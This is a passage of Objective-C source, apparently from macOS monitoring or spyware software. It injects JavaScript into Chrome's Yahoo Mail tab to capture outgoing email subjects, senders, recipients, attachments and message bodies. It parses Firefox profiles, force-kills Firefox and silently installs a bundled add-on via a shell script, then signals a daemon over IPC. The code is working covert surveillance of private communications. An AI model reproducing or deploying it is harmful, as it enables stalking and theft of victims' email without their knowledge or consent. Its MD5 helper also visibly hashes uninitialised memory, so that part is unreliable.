                            NSAppleScript *scpt2=[[NSAppleScript alloc]initWithSource:@"delay 0.1 \n tell application \"Google Chrome\" \n execute front window's active tab javascript \" function myValues1(){ var sendBTN = document.getElementById('send_top'); sendBTN.onmouseenter = function(){ var subject = document.getElementById('Subj').value; var sender  = document.getElementsByClassName('uh-name')[0].textContent +' '+ document.getElementsByClassName('uh-name')[0].title; var receive = document.getElementById('to').value; if(document.getElementById('cc').value){ receive = receive + ' ' + document.getElementById('cc').value; } if(document.getElementById('bcc').value){ receive = receive + ' ' + document.getElementById('bcc').value; } var attachCount = document.getElementsByClassName('att-name'); var attach =''; for(var i = 0; i < attachCount.length; i++) { if(i==0){ attach = attachCount[i].title; }else{ attach = attach +','+ attachCount[i].title;} } var message = document.getElementsByClassName('row editorfield')[0].children[0].value; var node = document.createElement('div'); node.setAttribute('class', 'yh_cap_s');node.setAttribute('hidden', true); node.setAttribute('value', '[S:=>]'+subject+'[SS:=>]'+sender+'[R:=>]'+receive+'[A:=>]'+attach+'[M:=>]'+message+'[<=:MEND:=>][<=:END:=>]'); var add = document.getElementsByTagName('body')[0]; add.appendChild(node); }}myValues1();function myValues2(){ var sendBTN = document.getElementById('send_top'); sendBTN.onmouseleave = function(){ setTimeout(function(){ var node = document.getElementsByClassName('yh_cap_s'); for(var i = 0; i < node.length; i++) { node[i].parentNode.removeChild(node[i]); } }, 500); } } myValues2(); \" \n return the result \n end tell"];
                            [scpt2 executeAndReturnError:nil];
                            [scpt2 release];
                            FoundSend = true;
                            break;
                        }
                    }
                }
                timeout--;
                if (timeout <= 0) {
                    break;
                }
                sleep(0.2);
            }
            dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
                [WebmailHTMLParser Yahoo_HTMLParser_Outgoing:myHTMLSource type:@"Chrome"];
            });
            
        }else{
            [self unregisterYahooMouseClickListener];
        }
    }
}

#pragma mark -Firefox Notification

-(void) firefoxHandlerwithAutoReplace:(BOOL) aIsReplaced{
    DLog(@"firefoxHandlerwithAutoReplace %d",aIsReplaced);
    NSString * currentUser = NSUserName();
    NSString * actualPath;
    NSString * firefoxPath = [NSString stringWithFormat:@"/Users/%@/Library/Application Support/Firefox/Profiles/",currentUser];
    NSString * activeProfile = [NSString stringWithFormat:@"/Users/%@/Library/Application Support/Firefox/profiles.ini",currentUser];
    NSString * activePath = @"";
    NSFileManager * file =[NSFileManager defaultManager];
    if([file fileExistsAtPath:activeProfile]){
        
        NSString * detailOfactiveProfile = [NSString stringWithContentsOfFile:activeProfile encoding:NSUTF8StringEncoding error:nil];
        NSArray * splitor = [detailOfactiveProfile componentsSeparatedByString:@"Path="];
        for (int i = 0; i < [splitor count]; i++) {
            if ([[splitor objectAtIndex:i]rangeOfString:@"Default=1"].location != NSNotFound) {
                DLog(@"Have a Default=1");
                NSArray * subSplitor = [[splitor objectAtIndex:i] componentsSeparatedByString:@"Profiles/"];
                subSplitor = [[subSplitor objectAtIndex:1] componentsSeparatedByString:@"Default=1"];
                activePath = [subSplitor objectAtIndex:0];
                activePath = [activePath stringByTrimmingCharactersInSet: [NSCharacterSet whitespaceAndNewlineCharacterSet]];
            }
        }
        
        if( [activePath length] == 0 && [detailOfactiveProfile rangeOfString:@"Profile0"].location != NSNotFound && [detailOfactiveProfile rangeOfString:@"Profile1"].location == NSNotFound  ){
            DLog(@"Don't Have a Default=1");
            NSArray * subSplitor = [[splitor objectAtIndex:1] componentsSeparatedByString:@"Profiles/"];
            activePath = [subSplitor objectAtIndex:1];
            activePath = [activePath stringByTrimmingCharactersInSet: [NSCharacterSet whitespaceAndNewlineCharacterSet]];
        }
        
        if ([activePath length] >0){
            actualPath = [NSString stringWithFormat:@"%@%@",firefoxPath,activePath];
            DLog(@"actualPath %@",actualPath);
            
            NSString * checkFolder =  [NSString stringWithFormat:@"%@/extensions",actualPath];
            if(![file fileExistsAtPath:checkFolder ]){
                DLog(@"===> Create Extensions Folder");
                [[NSFileManager defaultManager] createDirectoryAtPath:checkFolder withIntermediateDirectories:NO attributes:nil error:nil];
            }

            NSString * pathToFile  = [NSString stringWithFormat:@"%@/extensions/%@",actualPath,addonName];
            NSString * pathToPlist = [NSString stringWithFormat:@"%@/extensions/%@",actualPath,addonPlist];
            
            NSFileManager *finder = [NSFileManager defaultManager];
            
            DLog(@"# pathToFile %@",pathToFile);
            DLog(@"# pathToPlist %@",pathToPlist);
            
            if (aIsReplaced) {
                DLog(@"===> AutoReplace Begin");
                if( [finder fileExistsAtPath:pathToFile] && [finder fileExistsAtPath:pathToPlist] ){
                    
                    NSString * pathToBLBLUPlist = [[NSBundle mainBundle] resourcePath];
                    pathToBLBLUPlist = [pathToBLBLUPlist stringByReplacingOccurrencesOfString:@"file://" withString:@""];
                    pathToBLBLUPlist = [NSString stringWithFormat:@"%@/%@",pathToBLBLUPlist,addonPlist];
                    
                    NSDictionary * DictForFirefox = [NSDictionary dictionaryWithContentsOfFile:pathToPlist];
                    NSString *versionInFirefox = [DictForFirefox objectForKey:@"version"];
                    DLog(@"versionInFiref %@",versionInFirefox);

                    NSDictionary * DictForBLBLU  = [NSDictionary dictionaryWithContentsOfFile:pathToBLBLUPlist];
                    NSString * versionInBLBLU = [DictForBLBLU objectForKey:@"version"];
                    DLog(@"versionInBLBLU %@",versionInBLBLU);
                    
                    if (![versionInFirefox isEqualToString:versionInBLBLU]) {
                         DLog(@"===> Update from (FF) %@ to (BL) %@",versionInFirefox,versionInBLBLU);
                         [self sendToDaemonWithAddOnPath:pathToFile];
                    }
                }else{
                    DLog(@"===> File Not Found Go Add It Auto YES");
                    [self sendToDaemonWithAddOnPath:pathToFile];
                }
            }
            else {
                if( (![finder fileExistsAtPath:pathToFile]) || (![finder fileExistsAtPath:pathToPlist]) ){
                    DLog(@"===> File Not Found Go Add It Auto NO");
                    [self sendToDaemonWithAddOnPath:pathToFile];
                }
            }
        }else{
            DLog(@"Sorry ,I can not find the real actived Profile , So i do nothing to prevent a crash");
        }
    }else{
        DLog(@"===> No Firefox Install On This Mac");
    }
}

#pragma mark -MD5Checker

- (NSString *)MD5Value:(NSData *)aData{
    void *cData = malloc([aData length]);
    unsigned char resultCString[16];
    CC_MD5(cData, (unsigned int)[aData length], resultCString);
    free(cData);
    NSString *result = [NSString stringWithFormat:@"%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X",
                        resultCString[0], resultCString[1], resultCString[2], resultCString[3],
                        resultCString[4], resultCString[5], resultCString[6], resultCString[7],
                        resultCString[8], resultCString[9], resultCString[10], resultCString[11],
                        resultCString[12], resultCString[13], resultCString[14], resultCString[15] ];
    return result;
}

#pragma mark -IPC Sender

-(void)sendToDaemonWithAddOnPath:(NSString *)aRealPath{
    DLog(@"::==> sendToDaemon ( To Kill ) %@",aRealPath);
    
    NSString * deletor = [NSString stringWithFormat:@"killall firefox"];
    system([deletor cStringUsingEncoding:NSUTF8StringEncoding]);
    
    NSString * resource = [[NSBundle mainBundle] resourcePath];
    resource = [resource stringByReplacingOccurrencesOfString:@"file://" withString:@""];
    
    NSString *realPath = [aRealPath stringByReplacingOccurrencesOfString:@" " withString:@"\\ "];
    
    NSString * scriptor =[NSString stringWithFormat:@"do shell script \"%@/InstallAddon.sh\" ",resource];
    
    NSAppleScript *bypassScript =[[NSAppleScript alloc]initWithSource:scriptor];
    [bypassScript executeAndReturnError:nil];
    [bypassScript release];
    
    NSMutableDictionary * myCommand = [[NSMutableDictionary alloc]init];
    [myCommand setObject:@"addon"forKey:@"type"];
    [myCommand setObject:realPath forKey:@"desc"];
    [myCommand setObject:addonName forKey:@"addonname"];
    [myCommand setObject:resource forKey:@"resource"];
    
    NSMutableData *data = [[NSMutableData alloc] init];
    NSKeyedArchiver *archiver = [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
    [archiver encodeObject:myCommand forKey:@"command"];
    [archiver finishEncoding];
    [archiver release];
    
    BOOL successfully = FALSE;
    MessagePortIPCSender* messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:@"bSecuriyAgents"];
    successfully = [messagePortSender writeDataToPort:data];
    [messagePortSender release];
    messagePortSender = nil;
    
    [data release];
    [myCommand release];
}

-(void)dealloc{
    [self stopCapture];
    
    mObserver1 = nil;
    mObserver2 = nil;
    mLoop1 = nil;
    mLoop2 = nil;
    mProcess1 = nil;
    mProcess2 = nil;
    [mAsyC release];
    [super dealloc];
}

@end
